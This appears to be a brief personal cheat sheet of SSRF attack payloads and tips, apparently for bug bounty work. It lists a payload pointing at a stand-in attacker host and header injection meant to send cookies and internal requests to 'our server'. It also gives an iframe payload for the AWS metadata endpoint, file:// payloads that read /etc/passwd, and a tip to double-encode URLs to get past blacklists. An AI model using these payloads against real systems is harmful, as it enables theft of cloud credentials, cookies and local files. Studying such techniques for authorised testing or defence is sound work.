# SSRF


payload : `www.attacker.com/?`    <-- https://hackerone.com/reports/2442626

Use [[Certbot]] to make our http server to https to allow target website to ping our attacker hosted website.

### Blind SSRF

X-Forwarded-Host, X-Forwarded-For, X-HOST etc,

Add this header in the request followed by our attacker URL. 

it will send cookies, internal requests, IP. To our server.

SVG  `https://github.com/allanlw/svg-cheatsheet`

##### AWS Meta Data Service 
SSRF -> AWS Metadata Service
https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
`<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>`
`<img src="file:///etc/passwd">`

SSRF to Accessing Cloud Meta Data 

https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b

##### SSRF to LFI 

`file://etc/passwd`


Double Encode URL to avoid black listing ()